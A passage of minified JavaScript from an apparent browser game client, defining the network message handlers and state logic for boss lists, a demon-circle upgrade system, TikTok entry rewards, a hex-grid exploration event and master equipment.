f,f=window.GameSystem;!function(t){t.tuntianequip=c.ins.bind(c)}(f||(f={})),window.GameSystem=f,Systemap.TunTianEquipSystem=function(){return c.ins()},window.TianTunEquipSystem=c},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.KFBossSys=void 0;var n=i(14),o=i(7),s=function(t){function e(){var e=t.call(this)||this;return e.kfBossList={},e.kfBossAutoFightArr={},e.sysId=PackageID.KFBoss,e.regNetMsg(35,e.doBossList),e.regNetMsg(36,e.doBossKillList),e}return __extends(e,t),e.prototype.doBossList=function(t){this.kfBossList={};for(var e=t.readShort(),i=0;e>i;i++){var n=t.readInt(),o=t.readInt(),s=t.readInt();this.kfBossList[n]={id:n,bossId:o,time:s,isExKo:0},this.kfBossAutoFightArr[o]||(this.kfBossAutoFightArr[o]={}),this.kfBossAutoFightArr[o].time=s,this.kfBossAutoFightArr[o].isExKo=0}},e.prototype.doBossKillList=function(t){for(var e=t.readShort(),i=0;e>i;i++){var n=t.readInt();this.kfBossList[n].isExKo=t.readByte(),this.kfBossAutoFightArr[this.kfBossList[n].bossId].isExKo=this.kfBossList[n].isExKo}},e.prototype.sendBossInfo=function(){var t=this.getBytes(35);this.sendToServer(t)},e.prototype.sendKfBossGo=function(t){var e=this.getBytes(36);e.writeShort(t),this.sendToServer(e)},e.prototype.getBossShowAward=function(t){var e=o.GameServerCC.serverOpenDay+1,i=[];for(var n in t)e>=+n&&(i=t[n].concat());return i},__decorate([post()],e.prototype,"doBossList",null),e}(n.BaseSystem);e.KFBossSys=s,window.KFBossSys=s,__reflect(s.prototype,"KFBossSys",[]),Systemap.KFBossSys=function(){return s.ins()},window.KFBossSys=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DemonCir=void 0;var n=i(14),o=i(842),s=i(0),a=i(374),r=i(7),l=i(8),h=i(24),u=i(6),p=i(13),d=i(22),c=i(12),f=i(15),g=i(4),m=i(37),v=function(t){function e(){var e=t.call(this)||this;return e.demonCirLevel={},e.taskID=0,e.taskProgress=0,e.taskCD=0,e.firstRec=!0,e.encounterTimes=0,e.curLayerId=1,e.layerData=[1,0,0],e.isAllPass=!1,e.isFrist=!0,e.sysId=PackageID.DemonCir,e.regNetMsg(1,e.postRoleDatas),e.regNetMsg(2,e.postTask),e.regNetMsg(4,e.postDemonLevelUp),e.regNetMsg(5,e.postSpecialUp),e.regNetMsg(7,e.postShowChange),e.regNetMsg(8,e.postTalentUp),e.regNetMsg(13,e.postFbInfo),e.regNetMsg(14,e.postDemonCirLevelCfg),e.debugData(),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.debugData=function(){this.roleDeData||(this.roleDeData=[]);var t=new o.DemonCirRoleData(null);this.roleDeData[0]=t},e.prototype.postRoleDatas=function(t){if(this.taskState!=e.STATE_COMPLETE){var i=Object.keys(s.GlobalConfig.DemonCirTask).length,n=s.GlobalConfig.DemonCirTask[i];this.taskID=n.taskIdx,this.taskState=e.STATE_COMPLETE}var a=t.readByte();this.roleDeData||(this.roleDeData=[]),this.roleDeData.length=a;for(var r=0;a>r;r++){var l=this.roleDeData[r];l?l.parser(t):(l=new o.DemonCirRoleData(t),this.roleDeData[r]=l)}},e.prototype.postTask=function(t){},e.prototype.sendTaskEvent=function(){this.sendBaseProto(3)},e.prototype.sendDemonLevelUp=function(t,e){var i=this.getBytes(4);i.writeByte(t),i.writeByte(e),this.sendToServer(i)},e.prototype.postDemonLevelUp=function(t){var i=t.readByte(),n=t.readByte(),o=t.readInt(),s=t.readInt(),a=e.ins().getRoleDataByID(i);if(a){var r=a.getDemonDataByID(n);r.level=o,r.exp=s}},e.prototype.sendActiveDemon=function(t,e){var i=this.getBytes(5);
i.writeByte(t),i.writeByte(e),this.sendToServer(i)},e.prototype.sendSpecialUp=function(t,e){var i=this.getBytes(6);i.writeByte(t),i.writeByte(e),this.sendToServer(i)},e.prototype.postSpecialUp=function(t){var i=e.ins().getRoleDataByID(t.readByte());if(i){var n=t.readByte();t.position--;var o=i.getDemonDataByID(n);o?o.parser(t):(o=new a.DemonCirData(t),i.addDemonData(n,o))}},e.prototype.sendShowChange=function(t,e){var i=this.getBytes(7);i.writeByte(t),i.writeByte(e),this.sendToServer(i)},e.prototype.postShowChange=function(t){var i=t.readByte(),n=t.readByte(),o=e.ins().getRoleDataByID(i);o&&(o.showID=n);var s=t.readDouble(),a=m.EntityManager.ins().getEntityByHandle(s);a&&a.data&&a.data.type==EntityType.Role&&(a.infoModel&&(a.infoModel.demonCirID=n),a.data.demonCirID=n),g.ActorCC.postUpdateDemonCir()},e.prototype.sendTalentUp=function(t,e){var i=this.getBytes(8);i.writeByte(t),i.writeByte(e),this.sendToServer(i)},e.prototype.postTalentUp=function(t){var i=e.ins().getRoleDataByID(t.readByte());if(i){var n=i.getDemonDataByID(t.readByte());n.talentLv=t.readByte()}},e.prototype.getRoleDataByID=function(t){if(!this.roleDeData||!this.roleDeData.length)return null;for(var e=this.roleDeData.length,i=0;e>i;i++){var n=this.roleDeData[i];if(n.roleID==t)return n}return null},e.prototype.checkOpen=function(){var t=c.OpenSystem.ins().checkSysOpen(f.SystemType.DEMON_CIR);return t},e.prototype.getCDTime=function(){return Math.floor((l.DateUtils.formatMiniDateTime(this.taskCD)-r.GameServerCC.serverTime)/1e3)},e.prototype.sendEnterFb=function(){var t=this.getBytes(13);this.sendToServer(t)},e.prototype.postFbInfo=function(t){this.isAllPass=!1,this.curLayerId=t.readInt(),this.layerData=[];var e=h.CommonUtils.arraySort(h.CommonUtils.objectToArrayShallow(s.GlobalConfig.DemonCirFbConf),"id");if(e[e.length-1]&&this.curLayerId>e[e.length-1].id&&(this.isAllPass=!0,this.curLayerId=e[e.length-1].id),this.isAllPass)for(var i=0;i<e.length;i++)this.layerData.push(2);else for(var i=0;i<e.length;i++)e[i]&&e[i].id==this.curLayerId?this.layerData.push(1):e[i]&&this.curLayerId>e[i].id?this.layerData.push(2):this.layerData.push(0)},e.prototype.sendDemonCirLevel=function(t,e){var i=this.getBytes(14);i.writeInt(t),i.writeInt(e),this.sendToServer(i)},e.prototype.postDemonCirLevelCfg=function(t){var e={id:t.readInt(),level:t.readInt(),exp:t.readInt(),count:t.readInt(),expower:t.readInt(),attrs:[]};t.readInt();for(var i=t.readInt(),n=0;i>n;n++)e.attrs[n]={type:t.readInt(),value:t.readInt()};null==this.demonCirLevel[e.id]&&(this.demonCirLevel[e.id]={}),this.demonCirLevel[e.id][e.level]=e},e.prototype.isLastLayer=function(){return this.isAllPass},e.prototype.checkFb=function(){if(!this.checkOpen())return!1;if(this.isAllPass)return!1;var t=s.GlobalConfig.DemonCirFbConf[this.curLayerId];if(!t)return!1;var e=t.itemCount,i=u.BagCT.ins().getBagGoodsCountById(u.BagCT.BAG_TYPE_OTHTER,s.GlobalConfig.DemonCirConf.enterItemId);return this.isFrist||i>=e?!0:!1},e.prototype.getAddPerBySysIDRoleId=function(t,i){var n=0,o=e.ins().getRoleDataByID(i);if(!o)return n;for(var a=o.demonCirDatas?o.demonCirDatas.length:0,r=0;a>r;r++){var l=o.demonCirDatas[r];if(l&&l.talentLv>0){var h=s.GlobalConfig.DemonCirTalent[s.GlobalConfig.DemonCirBase[l.id].talent][l.talentLv];h.sysAttr&&h.sysAttr.type==t&&(n+=h.sysAttr.value)}}return n},e.prototype.getAddPerBySysID=function(t){for(var i=0,n=p.SubRoles.ins().subRolesLen,o=0;n>o;o++){var a=e.ins().getRoleDataByID(o);if(a)for(var r=a.demonCirDatas?a.demonCirDatas.length:0,l=0;r>l;l++){var h=a.demonCirDatas[o];if(h&&h.talentLv>0){var u=s.GlobalConfig.DemonCirTalent[s.GlobalConfig.DemonCirBase[h.id].talent][h.talentLv];u.sysAttr.type==t&&(i+=u.sysAttr.value)}}}return i},e.prototype.getAttrsBySysID=function(t,i){var n=e.ins().getAddPerBySysID(i);if(!n)return t;for(var o,s=[],a=t.length,r=0;a>r;r++)o=t[r],s.push(new d.AttributeData(o.type,Math.floor(o.value*n/1e4)));return s=s.concat(t),d.AttributeData.combineAtts(s)},e.prototype.checkXiLianRed=function(t,i){var n=e.ins().getRoleDataByID(t);if(!n)return!1;var o=n.getDemonDataByID(i);if(!o)return!1;var a=s.GlobalConfig.DemonCirBase[i];if(o.specialVals&&o.specialVals.length){for(var r=o.specialVals.length,l=!0,h=0;r>h;h++){var p=o.specialVals[h];if(!p||!p.length){l=!1;break}for(var d=p.length,c=!0,f=0;d>f;f++)if(p[f].value<s.GlobalConfig.DemonCirSkill[a.skillgroup[h]][f+1].attrMax){c=!1;break}if(!c){l=!1;break}}if(!l){var g=u.BagCT.ins().getBagItemById(a.skillcost.id);if(g&&Math.floor(g.count/a.skillcost.count)>=s.GlobalConfig.DemonCirConf.skillCautionCount)return!0}}return!1},e.prototype.checkCirMainRed=function(t,i){var n=e.ins().getRoleDataByID(t);if(!n)return!1;var o=s.GlobalConfig.DemonCirBase[i],a=n.getDemonDataByID(o.id);if(a){if(a.level<s.GlobalConfig.DemonCirBase[o.id].maxLevel){var r=u.BagCT.ins().getBagItemById(s.GlobalConfig.DemonCirConf.expItemId),l=r?r.count:0,h=this.getDemonCirLevelCfg(o.id,a.level);if(h&&s.GlobalConfig.DemonCirConf.expPerItem*l>=h.exp-a.exp)return!0}if(a.talentLv>0&&a.talentLv<Object.keys(s.GlobalConfig.DemonCirTalent[o.talent]).length){var p=s.GlobalConfig.DemonCirTalent[o.talent][a.talentLv+1],r=u.BagCT.ins().getBagItemById(o.mat);if(r&&r.count>=p.costCount)return!0}}else{var r=u.BagCT.ins().getBagItemById(o.mat);if(r&&r.count>=o.matCost)return!0}return!1},e.prototype.getDemonCirLevelCfg=function(t,e){var i=null;return this.demonCirLevel[t]&&(i=this.demonCirLevel[t][e]),i?i:(this.sendDemonCirLevel(t,e),null)},e.prototype.getUpgradeDesc=function(t,e){var i=s.GlobalConfig.DemonCirTalent[t][e];return i?i.upgradeDesc:""},e.prototype.getYunyanCost=function(t){var i=e.ins().getRoleDataByID(0);if(!i)return null;var n,o=s.GlobalConfig.DemonCirBase[t],a=i.getDemonDataByID(null===o||void 0===o?void 0:o.id);if(a){var r=e.ins().getDemonCirLevelCfg(o.id,a.level);r&&(n={type:1,id:s.GlobalConfig.DemonCirConf.expItemId,count:r.count})}else n={type:1,id:o.mat,count:o.matCost};return n},e.STATE_TASK=0,e.STATE_CAN_GET=1,e.STATE_GOT=2,e.STATE_COMPLETE=3,__decorate([post()],e.prototype,"postRoleDatas",null),__decorate([post()],e.prototype,"postTask",null),__decorate([post()],e.prototype,"postDemonLevelUp",null),__decorate([post()],e.prototype,"postSpecialUp",null),__decorate([post()],e.prototype,"postShowChange",null),__decorate([post()],e.prototype,"postTalentUp",null),__decorate([post()],e.prototype,"postFbInfo",null),__decorate([post()],e.prototype,"postDemonCirLevelCfg",null),e}(n.BaseSystem);e.DemonCir=v,window.DemonCir=v,__reflect(v.prototype,"DemonCir",[]),Systemap.DemonCir=function(){return v.ins()},window.DemonCir=v},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TikTokCT=void 0;var n=i(14),o=i(0),s=function(t){function e(){var e=t.call(this)||this;return e.isGet=1,e.isConcernGet=1,e.TikTokAwardArr=[],e.TikTokNowArr=[],e.sysId=PackageID.pfActivity,e.regNetMsg(25,e.tiktokAwardInfo),e.regNetMsg(26,e.tiktokConcernInfo),e.regNetMsg(27,e.tiktokAwardAllInfo),e.regNetMsg(31,e.tiktokAwardInitInfo),e.InitAwardArr(),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.InitAwardArr=function(){this.TikTokAwardArr=[];for(var t=0;4>t;t++){var e={type:t+1,isAward:0};this.TikTokAwardArr.push(e)}this.InitTikTokAwardDate()},e.prototype.InitTikTokAwardDate=function(){urlParam.isTikTokGame&&(1==urlParam.isTikTokSidebar&&this.setDoorType(1),2==urlParam.TikTokAddTo&&urlParam.TikTokDesTopCome&&this.setDoorType(2))},e.prototype.getTikTokAward=function(){var t=this.getBytes(25);this.sendToServer(t)},e.prototype.tiktokAwardInfo=function(t){this.isGet=t.readUnsignedByte(),this.updateTikTokAwardState()},e.prototype.updateTikTokAwardState=function(){},e.prototype.getTikTokConcern=function(){var t=this.getBytes(26);this.sendToServer(t)},e.prototype.tiktokConcernInfo=function(t){this.isConcernGet=t.readUnsignedByte(),this.updateTikTokConcernState()},e.prototype.updateTikTokConcernState=function(){},e.prototype.getTikTokAwardById=function(t){var e=this.getBytes(27);e.writeByte(t),this.sendToServer(e)},e.prototype.tiktokAwardAllInfo=function(t){for(var e=t.readUnsignedShort(),i=[],n=0;e>n;n++){var o=t.readUnsignedShort();i.push(o)}for(var n in this.TikTokAwardArr)for(var s=0;e>s;s++)i[s]==this.TikTokAwardArr[n].type&&(this.TikTokAwardArr[n].isAward=1);this.updateTikTokAllAwardState()},e.prototype.updateTikTokAllAwardState=function(){},e.prototype.returnInfoDataByType=function(t){for(var e in this.TikTokAwardArr)if(this.TikTokAwardArr[e].type==t)return this.TikTokAwardArr[e]},e.prototype.returnIsShow=function(){for(var t in this.TikTokAwardArr)if(0==this.TikTokAwardArr[t].isAward)return!0;return!1},e.prototype.tiktokAwardInitInfo=function(t){for(var e=t.readByte(),i=[],n=t.readByte(),o=t.readByte(),s=0;o>s;s++){var a=t.readByte();i.push(a)}this.TikTokNowArr[e]={day:n,arr:i},this.updateAwardData()},e.prototype.updateAwardData=function(){},e.prototype.getTikTokAwardByDay=function(t,e){var i=this.getBytes(32);i.writeByte(t),i.writeByte(e),this.sendToServer(i)},e.prototype.setDoorType=function(t){var e=this.getBytes(33);e.writeByte(t),this.sendToServer(e)},e.prototype.returnIsOver=function(t){var e,i=o.GlobalConfig.DyEntranceRewardCfg[t],n=null===(e=this.TikTokNowArr[t])||void 0===e?void 0:e.day;switch(t){case 1:var s=1;for(var a in i)s++;return(0==n||n)&&n>=s?!1:!0;case 2:var r=1;for(var l in i)r++;return(0==n||n)&&n>=r?!1:!0}},__decorate([delayCall(3e3)],e.prototype,"InitTikTokAwardDate",null),__decorate([post()],e.prototype,"updateTikTokAwardState",null),__decorate([post()],e.prototype,"updateTikTokConcernState",null),__decorate([post()],e.prototype,"updateTikTokAllAwardState",null),__decorate([post()],e.prototype,"updateAwardData",null),e}(n.BaseSystem);e.TikTokCT=s,window.TikTokCT=s,__reflect(s.prototype,"TikTokCT",[]),Systemap.TikTokCT=function(){return s.ins()},window.TikTokCT=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LingJingJobImg=e.LingJingWeather=e.LingJingGrid=e.LingJingCT=void 0;var n=i(8),o=i(14),s=i(0),a=i(7),r=i(2),l=function(t){function e(){var e=t.call(this)||this;return e.mapGridDic=[],e.nearGridList=[],e.showAltarGridList=[],e.altarGridList=[],e.towerGridList=[],e.fogGridList=[],e.lockGridTypeList=[],e.energyTimes=0,e.energy=0,e.weatherType=0,e.windDir=0,e.materialDic={},e.curPlayerPos={x:0,y:0},e.buffIdList=[],e.buildInfoDic=[],e.sysId=PackageID.Guanqia,e.regNetMsg(140,e.postLingJingMapInfo),e.regNetMsg(141,e.postPlayerMapInfo),e.regNetMsg(142,e.postLingJingEnergy),e.regNetMsg(143,e.postLingJingGoGrid),e.regNetMsg(144,e.postLingJingBuff),e.regNetMsg(145,e.postLingJingLock),e.regNetMsg(146,e.postLingJingFov),e.regNetMsg(147,e.postLingJingBuilding),e.regNetMsg(148,e.postLingJingBuildLvUp),e.regNetMsg(149,e.postLingJingMaterial),e.regNetMsg(150,e.postLingJingWeather),e.regNetMsg(151,e.postLingJingNewPos),e.regNetMsg(152,e.postLingJingFbGet),e.regNetMsg(153,e.postLingJingEnd),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.sendLingJingMapInfo=function(){var t=this.getBytes(140);this.sendToServer(t)},e.prototype.postLingJingMapInfo=function(t){for(var e=s.GlobalConfig.LingJingBaseConfig.mapSize[0]||0,i=s.GlobalConfig.LingJingBaseConfig.mapSize[1]||0,n=0;i>n;n++){this.mapGridDic[n]=[];for(var o=0;e>o;o++)this.mapGridDic[n][o]=new h(o,n)}for(var a=t.readShort(),n=0;a>n;n++){var r=t.readUnsignedByte(),l=t.readUnsignedByte(),u=this.mapGridDic[l]&&this.mapGridDic[l][r];u||(u=new h(r,l),this.mapGridDic[l]||(this.mapGridDic[l]=[]),this.mapGridDic[l][r]=u),u.parseBytes(t)}this.initAltarGridList(),this.initTowerGridList()},e.prototype.sendPlayerMapInfo=function(){var t=this.getBytes(141);this.sendToServer(t)},e.prototype.postPlayerMapInfo=function(t){for(var e=t.readShort(),i=0;e>i;i++){var n=t.readUnsignedByte(),o=t.readUnsignedByte(),s=t.readUnsignedByte(),a=this.getGridInfo(n,o);a&&a.setState(s)}var r=t.readUnsignedByte(),l=t.readUnsignedByte();this.setPlayerPos(r,l)},e.prototype.sendLingJingEnergy=function(){var t=this.getBytes(142);this.sendToServer(t)},e.prototype.postLingJingEnergy=function(t){this.energyTimes=n.DateUtils.formatMiniDateTime(t.readDouble()),this.energy=t.readShort()},e.prototype.sendLingJingGoGrid=function(t,e){var i=this.getBytes(143);i.writeByte(t),i.writeByte(e),this.sendToServer(i)},e.prototype.postLingJingGoGrid=function(t){var e=t.readUnsignedByte();if(e){var i=t.readShort();r.TipsCT.ins().showTips(gettext("需要体力{0}",i))}},e.prototype.sendLingJingBuff=function(){var t=this.getBytes(144);this.sendToServer(t)},e.prototype.postLingJingBuff=function(t){this.buffIdList=[];for(var e=t.readUnsignedByte(),i=0;e>i;i++){var n=t.readInt();this.buffIdList.push(n)}},e.prototype.postLingJingLock=function(t){this.lockGridTypeList=[];for(var e=t.readUnsignedByte(),i=0;e>i;i++){var n=t.readByte();this.lockGridTypeList[n]=1}},e.prototype.postLingJingFov=function(t){for(var e=t.readShort(),i=0;e>i;i++){var n=t.readUnsignedByte(),o=t.readUnsignedByte(),s=t.readUnsignedByte(),a=this.getGridInfo(n,o);a&&a.setState(s)}this.updateAltarShowGridList(),this.updateFogGridList()},e.prototype.sendLingJingBuilding=function(){var t=this.getBytes(147);this.sendToServer(t)},e.prototype.postLingJingBuilding=function(t){var e=t.readUnsignedByte();this.buildInfoDic={};for(var i=0;e>i;i++){var n=t.readShort(),o=t.readShort();o=1e3*o+a.GameServerCC.serverTime;var r=s.GlobalConfig.LingJingBuildConfig[n];r&&(this.buildInfoDic[r.type]={id:n,times:o},1==r.type&&this.updateFogGridList())}},e.prototype.sendLingJingBuildLvUp=function(t){var e=this.getBytes(148);e.writeByte(t),this.sendToServer(e)},e.prototype.postLingJingBuildLvUp=function(t){var e=(t.readByte(),t.readUnsignedByte(),t.readShort()),i=t.readShort(),n=s.GlobalConfig.LingJingBuildConfig[e];n&&(i=1e3*i+a.GameServerCC.serverTime,this.buildInfoDic[n.type]={id:e,times:i},1==n.type&&this.updateFogGridList())},e.prototype.sendLingJingMaterial=function(){var t=this.getBytes(149);this.sendToServer(t)},e.prototype.postLingJingMaterial=function(t){this.materialDic={};for(var e=t.readUnsignedByte(),i=0;e>i;i++){var n=t.readUnsignedByte(),o=t.readInt();this.materialDic[n]=o}},e.prototype.sendLingJingWeather=function(){var t=this.getBytes(150);this.sendToServer(t)},e.prototype.postLingJingWeather=function(t){var e=this.weatherType;this.weatherType=t.readUnsignedByte(),this.windDir=t.readByte(),e==this.weatherType||e!=u.FOG&&this.weatherType!=u.FOG||this.updateFogGridList()},e.prototype.postLingJingNewPos=function(t){var e=t.readUnsignedByte(),i=t.readUnsignedByte();this.setPlayerPos(e,i)},e.prototype.postLingJingFbGet=function(t){this.fbRewardObj={};for(var e=[],i=t.readUnsignedByte(),n=0;i>n;n++){var o=t.readInt();e.push(o)}this.fbRewardObj.buffIdList=e;for(var s={},a=t.readUnsignedByte(),n=0;a>n;n++){var r=t.readUnsignedByte(),l=t.readInt();s[r]=l}this.fbRewardObj.materialDic=s},e.prototype.postLingJingEnd=function(t){r.TipsCT.ins().showCenterTips(gettext("灵境探索活动已结束"))},e.prototype.setPlayerPos=function(t,e){this.curPlayerPos.x=t,this.curPlayerPos.y=e,this.nearGridList=this.getNearGrids(t,e),this.updateAltarShowGridList(),this.updateFogGridList()},e.prototype.checkIsNearGrid=function(t,e){for(var i=this.nearGridList,n=0;n<i.length;n++){var o=i[n];if(o.gridX==t&&o.gridY==e)return!0}return!1},e.prototype.getNearGrids=function(t,e){if(!this.mapGridDic||!this.mapGridDic.length)return[];var i;i=e%2===0?[{x:t-1,y:e},{x:t+1,y:e},{x:t,y:e-1},{x:t-1,y:e-1},{x:t,y:e+1},{x:t-1,y:e+1}]:[{x:t-1,y:e},{x:t+1,y:e},{x:t,y:e-1},{x:t+1,y:e-1},{x:t,y:e+1},{x:t+1,y:e+1}];for(var n=[],o=0,s=i;o<s.length;o++){var a=s[o];a.x>=0&&a.y>=0&&a.x<this.mapGridDic[0].length&&a.y<this.mapGridDic.length&&n.push(this.mapGridDic[a.y][a.x])}return n},e.prototype.getGridsAtDistance=function(t,e,i){if(0===i)return[this.mapGridDic[e][t]];for(var n=this.getNearGrids(t,e),o=[],s=0,a=n;s<a.length;s++){var r=a[s];o=o.concat(this.getGridsAtDistance(r.gridX,r.gridY,i-1))}return o},e.prototype.updateFogGridList=function(){if(this.fogGridList=[],this.weatherType==u.FOG){var t=this.buildInfoDic[1]?this.buildInfoDic[1].id:0,e=s.GlobalConfig.LingJingBuildConfig[t],i=e?e.id%1e3+1:1;this.fogGridList[this.curPlayerPos.y]=this.fogGridList[this.curPlayerPos.y]||[],this.fogGridList[this.curPlayerPos.y][this.curPlayerPos.x]=1;for(var n=this.getGridsAtDistance(this.curPlayerPos.x,this.curPlayerPos.y,i),o=0,a=n;o<a.length;o++){var r=a[o];this.fogGridList[r.gridY]=this.fogGridList[r.gridY]||[],this.fogGridList[r.gridY][r.gridX]=1}for(var l=0;l<this.towerGridList.length;l++){var h=this.towerGridList[l];if(h&&h.cfg&&h.cfg.arg&&1==h.state){this.fogGridList[h.gridY]=this.fogGridList[h.gridY]||[],this.fogGridList[h.gridY][h.gridX]=1;for(var p=this.getGridsAtDistance(h.gridX,h.gridY,h.cfg.arg.range),d=0,c=p;d<c.length;d++){var r=c[d];this.fogGridList[r.gridY]=this.fogGridList[r.gridY]||[],this.fogGridList[r.gridY][r.gridX]=1}}}}},e.prototype.checkIsFogShowGrid=function(t,e){return!(!this.fogGridList[e]||!this.fogGridList[e][t])},e.prototype.initTowerGridList=function(){this.towerGridList=[];for(var t=0;t<this.mapGridDic.length;t++)for(var e=this.mapGridDic[t],i=0;i<e.length;i++){var n=e[i];n&&n.cfg&&6==n.cfg.type&&this.towerGridList.push(n)}},e.prototype.initAltarGridList=function(){this.altarGridList=[];for(var t=0;t<this.mapGridDic.length;t++)for(var e=this.mapGridDic[t],i=0;i<e.length;i++){var n=e[i];n&&1!=n.state&&n.cfg&&5==n.cfg.type&&this.altarGridList.push(n)}},e.prototype.updateAltarShowGridList=function(){this.showAltarGridList=[];for(var t=this.altarGridList.length-1;t>=0;t--){var e=this.altarGridList[t];if(e&&e.cfg&&e.cfg.arg&&1!=e.state)for(var i=this.getGridsAtDistance(e.gridX,e.gridY,e.cfg.arg.range),n=0,o=i;n<o.length;n++){var s=o[n];this.showAltarGridList[s.gridY]=this.showAltarGridList[s.gridY]||[],this.showAltarGridList[s.gridY][s.gridX]=1}else this.altarGridList.splice(t,1)}},e.prototype.checkIsAltarShowGrid=function(t,e){return!(!this.showAltarGridList[e]||!this.showAltarGridList[e][t])},e.prototype.getGridInfo=function(t,e){return this.mapGridDic[e]?this.mapGridDic[e][t]:null},e.prototype.getMaterialNum=function(t){return this.materialDic[t]||0},e.prototype.getMaterialCfgByType=function(t){for(var e in s.GlobalConfig.LingJingMaterialConfig){var i=s.GlobalConfig.LingJingMaterialConfig[e];if(i.type==t)return i}return null},e.prototype.checkInEndTime=function(){var t=s.GlobalConfig.LingJingBaseConfig.endTime;if(!t||t.length<2)return!0;var e=a.GameServerCC.serverTime,i=n.DateUtils.showWeekLastDay(e,!0).getTime(),o=i+864e5;return i+=1e3*(3600*t[0]+60*t[1]),o>e&&e>i?!0:!1},__decorate([post()],e.prototype,"postLingJingMapInfo",null),__decorate([post()],e.prototype,"postPlayerMapInfo",null),__decorate([post()],e.prototype,"postLingJingEnergy",null),__decorate([post()],e.prototype,"postLingJingGoGrid",null),__decorate([post()],e.prototype,"postLingJingBuff",null),__decorate([post()],e.prototype,"postLingJingLock",null),__decorate([post()],e.prototype,"postLingJingFov",null),__decorate([post()],e.prototype,"postLingJingBuilding",null),__decorate([post()],e.prototype,"postLingJingBuildLvUp",null),__decorate([post()],e.prototype,"postLingJingMaterial",null),__decorate([post()],e.prototype,"postLingJingWeather",null),__decorate([post()],e.prototype,"postLingJingNewPos",null),__decorate([post()],e.prototype,"postLingJingFbGet",null),__decorate([post()],e.prototype,"postLingJingEnd",null),e}(o.BaseSystem);e.LingJingCT=l,window.LingJingCT=l,__reflect(l.prototype,"LingJingCT",[]);var h=function(){function t(t,e){this.buffList=[],this.state=-1,this.gridX=t,this.gridY=e,this.cfgId=0,this.buffList=[],this.state=-1,this.cfg=null}return t.prototype.parseBytes=function(t){this.cfgId=t.readShort();for(var e=t.readUnsignedByte(),i=0;e>i;i++){for(var n={gridX:t.readUnsignedByte(),gridY:t.readUnsignedByte(),idList:[]},o=t.readUnsignedByte(),a=0;o>a;a++)n.idList.push(t.readInt());this.buffList.push(n)}this.cfg=s.GlobalConfig.LingJingMapConfig[this.cfgId]},t.prototype.setState=function(t){this.state=t},t.prototype.isNearGrid=function(){return l.ins().checkIsNearGrid(this.gridX,this.gridY)},t.prototype.isPlayerGrid=function(){return l.ins().curPlayerPos.x==this.gridX&&l.ins().curPlayerPos.y==this.gridY},t.prototype.isAltarGrid=function(){return l.ins().checkIsAltarShowGrid(this.gridX,this.gridY)},t.prototype.isLockGrid=function(){return this.cfg&&this.cfg.type?!!l.ins().lockGridTypeList[this.cfg.type]:!1},t}();e.LingJingGrid=h,window.LingJingGrid=h,__reflect(h.prototype,"LingJingGrid",[]);var u;!function(t){t[t.SUNNY=1]="SUNNY",t[t.RAINY=2]="RAINY",t[t.FOG=3]="FOG",t[t.WIND=4]="WIND"}(u=e.LingJingWeather||(e.LingJingWeather={})),window.LingJingWeather=u,e.LingJingJobImg={1:"lingjing_zs",2:"lingjing_fs",3:"lingjing_ds",4:"lingjing_ck",5:"lingjing_gs"},Systemap.LingJingCT=function(){return l.ins()},window.LingJingCT=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MasterEquipEnum=e.MasterEquipCT=void 0;var n=i(14),o=i(13),s=i(40),a=i(0),r=i(6),l=i(69),h=i(10),u=i(4),p=i(2),d=function(t){function e(){var e=t.call(this)||this;return e.masterEquipPm=0,e.equipPowerDic=[],e.sysId=PackageID.Equip,e.regNetMsg(79,e.doGetMasterInfo),e.regNetMsg(81,e.postMasterEquipComResult),e.regNetMsg(82,e.postMasterEquipDeComResult),e.regNetMsg(83,e.postMasterEquipPm),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.sendMasterEquipWear=function(t,e,i){var n=this.getBytes(79);n.writeByte(t),n.writeDouble(e),n.writeByte(i),this.sendToServer(n)},e.prototype.doGetMasterInfo=function(t){var e=t.readByte(),i=t.readByte(),n=new s.ItemData;n.parser(t);var a=o.SubRoles.ins().getSubRoleByIndex(e);a.masterEquipDatas[i]=n,this.postMasterEquipChange(e,i)},e.prototype.sendMasterEquipOff=function(t,e){var i=this.getBytes(80);i.writeByte(t),i.writeByte(e),this.sendToServer(i)},e.prototype.sendMasterEquipCompose=function(t){var e=this.getBytes(81);e.writeInt(t),this.sendToServer(e)},e.prototype.postMasterEquipComResult=function(t){var e=t.readByte();return e},e.prototype.sendMasterEquipDeCompose=function(t){var e=this.getBytes(82);e.writeShort(t.length);for(var i=0;i<t.length;i++)e.writeDouble(t[i]);this.sendToServer(e)},e.prototype.postMasterEquipDeComResult=function(t){t.readByte()},e.prototype.postMasterEquipPm=function(t){this.masterEquipPm=t.readUnsignedInt()},e.prototype.postMasterEquipChange=function(t,e){return l.SoundUtil.play(l.SoundEnum.EQUIP),[t,e]},e.prototype.setEquipPowerDic=function(t,e,i){void 0===i&&(i=0),this.equipPowerDic[t]||(this.equipPowerDic[t]=[]),this.equipPowerDic[t][e]||(this.equipPowerDic[t][e]=0),this.equipPowerDic[t][e]=i},e.prototype.getEquipPowerDic=function(t,e){return this.equipPowerDic[t]&&this.equipPowerDic[t][e]?this.equipPowerDic[t][e]:0},e.prototype.getEquipMinLvConfig=function(t){void 0===t&&(t=0);var e=a.GlobalConfig.MasterSuitEquipConfig;for(var i in e){var n=e[i],o=a.GlobalConfig.ItemConfig[n.id];if(o&&h.ItemUtil.getSubType(o)==t&&1==n.level)return n}return null},e.prototype.getMasterSuitEquipEntry=function(t){void 0===t&&(t=0);var e=a.GlobalConfig.MasterSuitEquipEntryConfig,i=[];for(var n in e){var o=e[n];o.hide||o.body&&o.body.length&&!(o.body.indexOf(t)>=0)||i.push(o)}return i},e.prototype.getSuitLevel=function(t){void 0===t&&(t=0);for(var e=o.SubRoles.ins().getSubRoleByIndex(t),i=Number.MAX_VALUE,n=0;n<c.MasterEquipMaxSlot;n++){var s=e.masterEquipDatas[n];if(s&&0!=s.configID){var r=a.GlobalConfig.MasterSuitEquipConfig[s.configID];(!r||r.level<i)&&(i=r?r.level:0)}else i=0}return i},e.prototype.getSuitCount=function(t,e){for(var 